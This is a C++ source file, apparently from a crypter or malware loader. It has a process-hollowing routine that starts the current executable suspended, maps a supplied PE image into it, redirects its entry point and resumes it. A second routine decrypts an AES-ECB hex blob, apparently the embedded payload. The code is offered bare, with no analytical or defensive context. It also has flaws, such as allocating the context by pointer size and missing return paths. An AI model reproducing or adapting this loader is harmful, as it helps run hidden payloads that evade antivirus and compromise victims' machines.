#include "functions.h"

int RunPortableExecutable(void* Image) {
	IMAGE_DOS_HEADER* DOSHeader;
	IMAGE_NT_HEADERS* NTHeader;
	IMAGE_SECTION_HEADER* SectionHeader;
	PROCESS_INFORMATION PI;
	STARTUPINFOA SI;
	CONTEXT* CTX;

	DWORD* ImageBase;
	void* pImageBase;

	int count;
	char CurrentFilePath[1024];

	DOSHeader = PIMAGE_DOS_HEADER(Image);
	NTHeader = PIMAGE_NT_HEADERS(DWORD(Image) + DOSHeader->e_lfanew);

	GetModuleFileNameA(0, CurrentFilePath, 1024);

	if (NTHeader->Signature == IMAGE_NT_SIGNATURE) {
		ZeroMemory(&PI, sizeof(PI));
		ZeroMemory(&SI, sizeof(SI));

		if (CreateProcessA(CurrentFilePath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &SI, &PI)) {
			CTX = LPCONTEXT(VirtualAlloc(NULL, sizeof(CTX), MEM_COMMIT, PAGE_READWRITE));
			CTX->ContextFlags = CONTEXT_FULL;

			if (GetThreadContext(PI.hThread, LPCONTEXT(CTX))) {
				ReadProcessMemory(PI.hProcess, LPCVOID(CTX->Ebx + 8), LPVOID(&ImageBase), 4, 0);

				pImageBase = VirtualAllocEx(PI.hProcess, LPVOID(NTHeader->OptionalHeader.ImageBase), NTHeader->OptionalHeader.SizeOfImage, 0x3000, PAGE_EXECUTE_READWRITE);

				WriteProcessMemory(PI.hProcess, pImageBase, Image, NTHeader->OptionalHeader.SizeOfHeaders, NULL);

				for (count = 0; count < NTHeader->FileHeader.NumberOfSections; count++) {
					SectionHeader = PIMAGE_SECTION_HEADER(DWORD(Image) + DOSHeader->e_lfanew + 248 + (count * 40));

					WriteProcessMemory(PI.hProcess, LPVOID(DWORD(pImageBase) + SectionHeader->VirtualAddress), LPVOID(DWORD(Image) + SectionHeader->PointerToRawData), SectionHeader->SizeOfRawData, 0);
				}
				WriteProcessMemory(PI.hProcess, LPVOID(CTX->Ebx + 8), LPVOID(&NTHeader->OptionalHeader.ImageBase), 4, 0);

				CTX->Eax = DWORD(pImageBase) + NTHeader->OptionalHeader.AddressOfEntryPoint;
				SetThreadContext(PI.hThread, LPCONTEXT(CTX));
				ResumeThread(PI.hThread);

				return 0;
			}
		}
	}
}

std::string DecryptStringAES(char *Key, std::string HEX_Message, int size) {
	static const char* const lut = "0123456789ABCDEF";
	int i = 0;
	char* Res;
	AES_KEY dec_key;
	std::string auxString, output, newString;

	for (i = 0; i < size; i += 2) {
		std::string byte = HEX_Message.substr(i, 2);
		char chr = (char)(int)strtol(byte.c_str(), NULL, 16);
		auxString.push_back(chr);
	}

	const char *Msg = auxString.c_str();
	Res = (char *)malloc(size);

	AES_set_decrypt_key((unsigned char *)Key, 128, &dec_key);

	for (i = 0; i <= size; i += 16) {
		AES_ecb_encrypt((unsigned char *)Msg + i, (unsigned char *)Res + i, &dec_key, AES_DECRYPT);
	}

	output.reserve(2 * size);

	for (size_t i = 0; i < size; ++i) {
		const unsigned char c = Res[i];
		output.push_back(lut[c >> 4]);
		output.push_back(lut[c & 15]);
	}

	int len = output.length();

	for (int i = 0; i < len; i += 2) {
		std::string byte = output.substr(i, 2);
		char chr = (char)(int)strtol(byte.c_str(), NULL, 16);
		newString.push_back(chr);
	}

	free(Res);

	return newString;
}
